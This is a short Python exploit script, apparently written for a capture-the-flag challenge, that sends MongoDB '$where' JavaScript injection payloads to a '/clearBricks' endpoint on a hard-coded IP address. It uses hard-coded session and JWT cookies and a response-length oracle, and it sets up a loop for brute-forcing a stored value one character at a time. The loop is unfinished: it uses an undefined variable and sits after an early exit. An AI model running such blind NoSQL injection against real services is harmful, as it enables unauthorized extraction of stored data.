from itertools import count
from string import ascii_lowercase, digits, ascii_letters, printable
from idna import check_label
import requests
from coollogs import log
from tqdm import tqdm

def check_function(js: str) -> bool:
    cookies = {
        'session': '.eJwljktqAzEQBe-itRdSS_2RLzO0-kOCIYEZe2V89wiyetTbVL3LkWdcX-X-PF9xK8e3l3tRHDmqu2gOpGaSEBadTB3dfSkDRYojIzhKjCmjBXvDyBbeAVdOpqQOvmYCtGwqwmZBKs2jY1UdvUGqrZSq05SQ9kbOgWWHvK44_2ugbrbrzOP5-4if_WDM4dVYeTLLNtZtT9MFtLSuaa51ZOfy-QM1eUHN.YlHgtw.ZQxthAhCkU_TfB25bdSMKe36hoU',
        'access_token_cookie': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0OTU2OTc3MSwianRpIjoiYjdmZTMzOWUtYTlmMC00YTczLWJkMzEtYjRkM2EyOGJlN2VhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6Imxla3N1cyIsIm5iZiI6MTY0OTU2OTc3MSwiZXhwIjoxNjQ5NTc5NzcxLCJicmlja3Nfa2V5X3BhdGgiOiJzZWNyZXRzLzIwOSJ9.luwdCzSYxVbTrp55OZNwNON3HNxQqcLSBic1lSG6nfU',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'http://51.250.81.57:8081',
        'Referer': 'http://51.250.81.57:8081/home',
        'Sec-GPC': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36',
    }

    json_data = {
        'args': [
            'find',
            'bricks',
        ],
        'kwargs': {
            "filter": {
                "$where": js
            }
        }
    }

    response = requests.post('http://51.250.81.57:8081/clearBricks', headers=headers, cookies=cookies, json=json_data, verify=False)
    resp_len = response.json()['db_response_length']
    log.debug(response.json())
    return resp_len > 74

js = """function() {{
    let data = this.content;
    return true;
}};
"""

alpha = printable
log.info(check_function(js))
exit()

for i in count(1):
    new_prefixes = []
    for prefix in prefixes:
        for char in alpha:
            to_check = prefix + char
            if check_function(js.format(prefix=to_check)):
                new_prefixes.append(to_check)
                log.success(f'There is value starting with {to_check}')

    prefixes = new_prefixes
    log.info(f'Finished bruteforcing prefixes of length {i}; results: {prefixes}')
